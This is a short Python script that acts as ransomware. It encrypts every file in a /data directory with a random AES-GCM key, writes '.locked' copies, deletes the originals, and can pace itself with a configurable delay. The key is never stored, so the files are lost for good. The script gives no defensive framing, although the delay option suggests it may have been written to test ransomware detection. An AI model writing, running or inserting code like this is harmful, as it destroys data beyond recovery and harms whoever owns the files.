import os, time
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
aes = AESGCM(AESGCM.generate_key(bit_length=256))
delay = float(os.environ.get("FILE_DELAY", "0"))
for name in sorted(os.listdir("/data")):
    if name.endswith(".locked"):
        continue
    p = "/data/" + name
    data = open(p, "rb").read()
    nonce = os.urandom(12)
    open(p + ".locked", "wb").write(nonce + aes.encrypt(nonce, data, None))
    os.remove(p)
    print("encrypted", name, flush=True)
    time.sleep(delay)
